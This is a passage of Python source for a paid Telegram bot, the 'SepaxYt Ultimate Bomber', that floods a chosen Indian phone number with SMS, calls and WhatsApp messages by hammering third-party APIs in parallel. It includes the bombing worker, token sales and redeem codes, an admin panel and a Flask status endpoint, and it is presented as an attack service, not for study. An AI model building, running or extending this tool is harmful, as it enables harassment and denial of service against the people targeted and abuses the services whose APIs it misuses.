                    data = api["data"](phone) if api["data"] else None
                    async with session.post(url, headers=headers, data=data, timeout=5, ssl=False) as response:
                        if response.status in [200, 201, 202, 204]:
                            self.stats["hits"] += 1
                else:
                    async with session.get(url, headers=headers, timeout=5, ssl=False) as response:
                        if response.status in [200, 201, 202, 204]:
                            self.stats["hits"] += 1
                
                self.stats["total"] += 1
                await asyncio.sleep(0.05)
                
            except:
                await asyncio.sleep(0.1)
                continue
    
    async def start_bombing(self, phone, user_id):
        self.running = True
        self.current_phone = phone
        self.current_user = user_id
        self.stats = {"calls": 0, "whatsapp": 0, "sms": 0, "hits": 0, "total": 0, "start_time": time.time()}
        
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=10, verify_ssl=False)
        
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for api in ULTIMATE_APIS:
                task = asyncio.create_task(self.bomb_worker(session, api, phone))
                tasks.append(task)
            
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except:
                pass
            
            # Save history
            db.add_history(user_id, phone, self.stats["calls"], self.stats["whatsapp"], 
                          self.stats["sms"], self.stats["hits"])
            db.update_hits(user_id, self.stats["hits"])
    
    def stop(self):
        self.running = False

destroyer = PhoneDestroyer()

# ============ TELEGRAM BOT ============
app = None

async def is_admin(user_id):
    user = db.get_user(user_id)
    if user:
        return user[6] == 1 or user_id == OWNER_ID
    return user_id == OWNER_ID

async def check_channels(update):
    user_id = update.effective_user.id
    channels = db.get_channels()
    for channel in channels:
        try:
            member = await app.bot.get_chat_member(channel, user_id)
            if member.status in ['member', 'administrator', 'creator']:
                return True
        except:
            continue
    return len(channels) == 0

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db.add_user(user.id, user.username, user.first_name)
    user_data = db.get_user(user.id)
    
    # Check channel join
    if not await check_channels(update):
        channels = db.get_channels()
        keyboard = []
        for channel in channels:
            keyboard.append([InlineKeyboardButton(f"📢 Join {channel}", url=f"https://t.me/{channel.replace('@','')}")])
        keyboard.append([InlineKeyboardButton("✅ I've Joined", callback_data='check_join')])
        await update.message.reply_text(
            f"🔒 **CHANNELS REQUIRED**\n\n"
            f"Hey {user.first_name}! Please join our channels first:\n\n"
            f"📢 Join all channels below to use this bot:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
        return
    
    if user_data and user_data[5] == 1:  # is_banned
        await update.message.reply_text("❌ **You are banned from using this bot!**")
        return
    
    keyboard = [
        [InlineKeyboardButton("💀 START BOMB", callback_data='bomb')],
        [InlineKeyboardButton("🛑 STOP BOMB", callback_data='stop')],
        [InlineKeyboardButton("📊 MY STATUS", callback_data='status')],
        [InlineKeyboardButton("🪙 TOKENS", callback_data='tokens')],
        [InlineKeyboardButton("💳 BUY TOKENS", url="https://t.me/LuaFucker")],
        [InlineKeyboardButton("🔴 REDEEM CODE", callback_data='redeem')],
        [InlineKeyboardButton("💰 CHECK PRICE", callback_data='price')],
    ]
    
    if await is_admin(user.id):
        keyboard.append([InlineKeyboardButton("👑 ADMIN PANEL", callback_data='admin')])
    
    await update.message.reply_text(
        f"💀 **SEPAXYT ULTIMATE BOMBER**\n\n"
        f"👤 **User:** {user.first_name}\n"
        f"🪙 **Tokens:** {user_data[2] if user_data else 100}\n"
        f"📞 **Total Used:** {user_data[3] if user_data else 0}\n"
        f"💥 **Total Hits:** {user_data[4] if user_data else 0}\n"
        f"⚡ **APIs:** {len(ULTIMATE_APIS)}\n"
        f"🔥 **Status:** {'🟢 RUNNING' if destroyer.running else '🔴 IDLE'}\n\n"
        f"📞 **Send any 10-digit number to bomb!**\n"
        f"👑 **Owner:** @SepaxYt",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    user_data = db.get_user(user_id)
    if user_data and user_data[5] == 1:
        await update.message.reply_text("❌ **You are banned!**")
        return
    
    if text.isdigit() and len(text) == 10:
        if not user_data or user_data[2] < 1:
            await update.message.reply_text(
                f"❌ **Insufficient tokens!**\n\n"
                f"🪙 Your tokens: {user_data[2] if user_data else 0}\n"
                f"💳 Buy tokens from: @LuaFucker\n"
                f"💰 Each bomb costs 1 token",
                parse_mode='Markdown'
            )
            return
        
        db.update_tokens(user_id, -1)
        db.update_used(user_id)
        
        await update.message.reply_text(
            f"💀 **BOMBING STARTED!**\n\n"
            f"📞 **Target:** +91{text}\n"
            f"⚡ **APIs:** {len(ULTIMATE_APIS)}\n"
            f"🔄 **Running in background...**\n\n"
            f"🛑 Use /stop to stop bombing",
            parse_mode='Markdown'
        )
        
        def run_bomb():
            try:
                asyncio.run(destroyer.start_bombing(text, user_id))
            except:
                pass
        
        thread = threading.Thread(target=run_bomb)
        thread.daemon = True
        thread.start()
        
    else:
        await update.message.reply_text(
            "📞 **Invalid input!**\n\n"
            "Send a 10-digit Indian phone number.\n"
            "Example: `9876543210`",
            parse_mode='Markdown'
        )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    user_data = db.get_user(user_id)
    if user_data and user_data[5] == 1:
        await query.edit_message_text("❌ **You are banned!**")
        return
    
    if query.data == 'check_join':
        if await check_channels(update):
            await query.edit_message_text("✅ **Joined Successfully!**\nUse /start again.")
        else:
            await query.edit_message_text("❌ **Join all channels first!**")
        return
    
    if query.data == 'bomb':
        await query.edit_message_text("📞 **Send 10-digit Indian number:**")
    
    elif query.data == 'stop':
        destroyer.stop()
        await query.edit_message_text(
            f"🛑 **BOMBING STOPPED!**\n\n"
            f"📊 Final stats:\n"
            f"💥 Hits: {destroyer.stats['hits']}\n"
            f"🎯 Total: {destroyer.stats['total']}",
            parse_mode='Markdown'
        )
    
    elif query.data == 'status':
        elapsed = time.time() - destroyer.stats["start_time"] if destroyer.stats["start_time"] else 0
        await query.edit_message_text(
            f"📊 **BOMBER STATUS**\n\n"
            f"🔥 **Status:** {'🟢 RUNNING' if destroyer.running else '🔴 IDLE'}\n"
            f"📞 **Target:** +91{destroyer.current_phone if destroyer.current_phone else 'None'}\n"
            f"📞 **Calls:** {destroyer.stats['calls']}\n"
            f"📱 **WhatsApp:** {destroyer.stats['whatsapp']}\n"
            f"💬 **SMS:** {destroyer.stats['sms']}\n"
            f"💥 **Hits:** {destroyer.stats['hits']}\n"
            f"🎯 **Total:** {destroyer.stats['total']}\n"
            f"⏰ **Uptime:** {int(elapsed//60)}m {int(elapsed%60)}s\n"
            f"⚡ **APIs:** {len(ULTIMATE_APIS)}",
            parse_mode='Markdown'
        )
    
    elif query.data == 'tokens':
        await query.edit_message_text(
            f"🪙 **TOKEN BALANCE**\n\n"
            f"👤 **User:** {query.from_user.first_name}\n"
            f"🪙 **Tokens:** {user_data[2] if user_data else 0}\n"
            f"📞 **Used:** {user_data[3] if user_data else 0}\n"
            f"💥 **Hits:** {user_data[4] if user_data else 0}\n\n"
            f"💳 **Buy tokens:** @LuaFucker\n"
            f"💰 **Price:** ₹{TOKEN_PRICE}/100 tokens",
            parse_mode='Markdown'
        )
    
    elif query.data == 'redeem':
        await query.edit_message_text("🎯 **Enter your redeem code:**")
        context.user_data['awaiting_redeem'] = True
    
    elif query.data == 'price':
        await query.edit_message_text(
            f"💰 **PRICE LIST**\n\n"
            f"🪙 100 tokens = ₹{TOKEN_PRICE}\n"
            f"🪙 500 tokens = ₹{TOKEN_PRICE * 4}\n"
            f"🪙 1000 tokens = ₹{TOKEN_PRICE * 7}\n"
            f"🪙 5000 tokens = ₹{TOKEN_PRICE * 30}\n\n"
            f"💳 **Contact:** @LuaFucker\n"
            f"💳 **UPI:** Coming Soon...",
            parse_mode='Markdown'
        )
    
    elif query.data == 'admin' and await is_admin(user_id):
        await admin_panel(query)

async def admin_panel(query):
    users = db.get_all_users()
    total_users = len(users)
    total_tokens = sum(u[3] for u in users)
    total_used = sum(u[4] for u in users)
    total_hits = sum(u[5] for u in users)
    
    keyboard = [
        [InlineKeyboardButton("👥 USERS LIST", callback_data='admin_users')],
        [InlineKeyboardButton("🎯 TARGETS", callback_data='admin_targets')],
        [InlineKeyboardButton("🪙 CREATE CODE", callback_data='admin_create_code')],
        [InlineKeyboardButton("💳 ADD TOKENS", callback_data='admin_add_tokens')],
        [InlineKeyboardButton("🚫 BAN USER", callback_data='admin_ban')],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data='admin_unban')],
        [InlineKeyboardButton("📢 ADD CHANNEL", callback_data='admin_add_channel')],
        [InlineKeyboardButton("📋 CHANNELS", callback_data='admin_channels')],
        [InlineKeyboardButton("📊 FULL STATS", callback_data='admin_stats')],
        [InlineKeyboardButton("🔙 BACK", callback_data='back_menu')]
    ]
    
    await query.edit_message_text(
        f"👑 **ADMIN PANEL**\n\n"
        f"👥 **Total Users:** {total_users}\n"
        f"🪙 **Total Tokens:** {total_tokens}\n"
        f"📞 **Total Used:** {total_used}\n"
        f"💥 **Total Hits:** {total_hits}\n"
        f"⚡ **APIs:** {len(ULTIMATE_APIS)}\n"
        f"🔥 **Bomber:** {'🟢 RUNNING' if destroyer.running else '🔴 IDLE'}",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

# ============ COMMANDS ============
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    destroyer.stop()
    await update.message.reply_text("🛑 **Bombing stopped!**")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    elapsed = time.time() - destroyer.stats["start_time"] if destroyer.stats["start_time"] else 0
    await update.message.reply_text(
        f"📊 **BOMBER STATUS**\n\n"
        f"🔥 **Status:** {'🟢 RUNNING' if destroyer.running else '🔴 IDLE'}\n"
        f"📞 **Target:** +91{destroyer.current_phone if destroyer.current_phone else 'None'}\n"
        f"📞 **Calls:** {destroyer.stats['calls']}\n"
        f"📱 **WhatsApp:** {destroyer.stats['whatsapp']}\n"
        f"💬 **SMS:** {destroyer.stats['sms']}\n"
        f"💥 **Hits:** {destroyer.stats['hits']}\n"
        f"🎯 **Total:** {destroyer.stats['total']}\n"
        f"⏰ **Uptime:** {int(elapsed//60)}m {int(elapsed%60)}s\n"
        f"⚡ **APIs:** {len(ULTIMATE_APIS)}",
        parse_mode='Markdown'
    )

async def tokens_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_data = db.get_user(update.effective_user.id)
    await update.message.reply_text(
        f"🪙 **TOKEN BALANCE**\n\n"
        f"👤 **User:** {update.effective_user.first_name}\n"
        f"🪙 **Tokens:** {user_data[2] if user_data else 0}\n"
        f"📞 **Used:** {user_data[3] if user_data else 0}\n"
        f"💥 **Hits:** {user_data[4] if user_data else 0}\n\n"
        f"💳 **Buy tokens:** @LuaFucker",
        parse_mode='Markdown'
    )

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎯 **Enter your redeem code:**")
    context.user_data['awaiting_redeem'] = True

async def handle_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = update.message.text.strip().upper()
    tokens = db.redeem_code(code, user_id)
    if tokens:
        await update.message.reply_text(
            f"✅ **Redeemed successfully!**\n\n"
            f"🪙 **+{tokens} tokens added!**\n"
            f"📊 **New balance:** {db.get_user(user_id)[2]}",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "❌ **Invalid or expired code!**\n\n"
            "Make sure:\n"
            "1. Code is correct\n"
            "2. Code is not used\n"
            "3. Code is not expired",
            parse_mode='Markdown'
        )
    context.user_data['awaiting_redeem'] = False

# ============ ADMIN COMMANDS ============
async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        return
    users = db.get_all_users()
    text = "👥 **USERS LIST**\n\n"
    for u in users[:20]:
        status = "🔴 Banned" if u[6] else "🟢 Active"
        text += f"👤 {u[2]} (@{u[1]}) - 🪙 {u[3]} - 📞 {u[4]} - 💥 {u[5]} - {status}\n"
    if len(users) > 20:
        text += f"\n... and {len(users)-20} more users"
    await update.message.reply_text(text, parse_mode='Markdown')

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        return
    users = db.get_all_users()
    codes = db.get_redeem_codes()
    targets = db.get_targets()
    
    await update.message.reply_text(
        f"📊 **FULL STATISTICS**\n\n"
        f"👥 **Users:** {len(users)}\n"
        f"🪙 **Total Tokens:** {sum(u[3] for u in users)}\n"
        f"📞 **Total Used:** {sum(u[4] for u in users)}\n"
        f"💥 **Total Hits:** {sum(u[5] for u in users)}\n"
        f"📋 **Redeem Codes:** {len(codes)}\n"
        f"🎯 **Targets:** {len(targets)}\n"
        f"⚡ **APIs:** {len(ULTIMATE_APIS)}\n"
        f"🔥 **Bomber:** {'🟢 RUNNING' if destroyer.running else '🔴 IDLE'}",
        parse_mode='Markdown'
    )

async def admin_add_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        return
    try:
        user_id = int(context.args[0])
        amount = int(context.args[1])
        db.update_tokens(user_id, amount)
        await update.message.reply_text(f"✅ Added {amount} tokens to user {user_id}")
    except:
        await update.message.reply_text("❌ Use: /addtokens [user_id] [amount]")

async def admin_create_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        return
    try:
        tokens = int(context.args[0])
        code = db.generate_redeem(tokens, update.effective_user.id)
        await update.message.reply_text(
            f"✅ **Redeem Code Created!**\n\n"
            f"📝 `{code}`\n"
            f"🪙 **{tokens} tokens**\n"
            f"⏰ **Valid for 30 days**",
            parse_mode='Markdown'
        )
    except:
        await update.message.reply_text("❌ Use: /createcode [tokens]")

async def admin_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        return
    try:
        user_id = int(context.args[0])
        db.ban_user(user_id)
        await update.message.reply_text(f"🚫 User {user_id} banned!")
    except:
        await update.message.reply_text("❌ Use: /ban [user_id]")

async def admin_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        return
    try:
        user_id = int(context.args[0])
        db.unban_user(user_id)
        await update.message.reply_text(f"✅ User {user_id} unbanned!")
    except:
        await update.message.reply_text("❌ Use: /unban [user_id]")

async def admin_add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        return
    try:
        channel = context.args[0]
        if not channel.startswith('@'):
            channel = '@' + channel
        db.add_channel(channel, update.effective_user.id)
        await update.message.reply_text(f"✅ Channel {channel} added!")
    except:
        await update.message.reply_text("❌ Use: /addchannel @channel")

async def admin_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update.effective_user.id):
        return
    channels = db.get_channels()
    text = "📢 **CHANNELS**\n\n"
    for c in channels:
        text += f"📢 {c}\n"
    await update.message.reply_text(text, parse_mode='Markdown')

# ============ FLASK APP ============
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return jsonify({
        "status": "running",
        "bot": "SepaxYt Ultimate Bomber",
        "apis": len(ULTIMATE_APIS),
        "running": destroyer.running,
        "hits": destroyer.stats["hits"],
        "uptime": time.time() - destroyer.stats["start_time"] if destroyer.stats["start_time"] else 0
    })

@flask_app.route('/health')
def health():
    return "OK", 200

def run_flask():
    try:
        flask_app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
    except:
        pass

# ============ MAIN ============
def main():
    global app
    
    print("=" * 60)
    print("💀 SEPAXYT ULTIMATE PHONE DESTROYER")
    print("=" * 60)
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"👑 Owner: {OWNER_ID}")
    print(f"🌐 Port: {PORT}")
    print(f"⚡ APIs: {len(ULTIMATE_APIS)}")
    print("=" * 60)
    
    # Start Flask
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print("✅ Flask server started")
    
    # Create bot
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        
        # Commands
        app.add_handler(CommandHandler("start", start_command))
        app.add_handler(CommandHandler("stop", stop_command))
        app.add_handler(CommandHandler("status", status_command))
        app.add_handler(CommandHandler("tokens", tokens_command))
        app.add_handler(CommandHandler("redeem", redeem_command))
        app.add_handler(CommandHandler("addtokens", admin_add_tokens))
        app.add_handler(CommandHandler("createcode", admin_create_code))
        app.add_handler(CommandHandler("ban", admin_ban))
        app.add_handler(CommandHandler("unban", admin_unban))
        app.add_handler(CommandHandler("addchannel", admin_add_channel))
        app.add_handler(CommandHandler("channels", admin_channels))
        app.add_handler(CommandHandler("users", admin_users))
        app.add_handler(CommandHandler("stats", admin_stats))
        app.add_handler(CallbackQueryHandler(button_callback))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        print("✅ Bot handlers registered")
        print("🚀 Bot is starting...")
        
        app.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        print(f"❌ Bot error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()